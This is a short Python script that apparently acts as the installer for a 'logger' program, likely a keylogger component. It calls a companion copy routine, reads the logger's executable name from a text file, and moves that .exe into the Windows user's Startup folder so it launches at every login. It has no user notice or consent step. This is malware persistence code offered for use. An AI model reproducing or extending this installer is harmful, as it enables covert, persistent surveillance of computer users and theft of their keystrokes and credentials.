import os

from copyLogger import copy


def install(path=f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'):
    copy()

    file = open('name.txt')
    loggerName = file.readline() + '.exe'
    file.close()

    end = 'Logger installed succesfully'
    try:
        os.rename(loggerName ,f'{path}/{loggerName}')
    except FileExistsError:
        end = 'File already exist'
    except BaseException:
        end = 'Installation error'
    print(end)

if __name__ == '__main__':
    install()
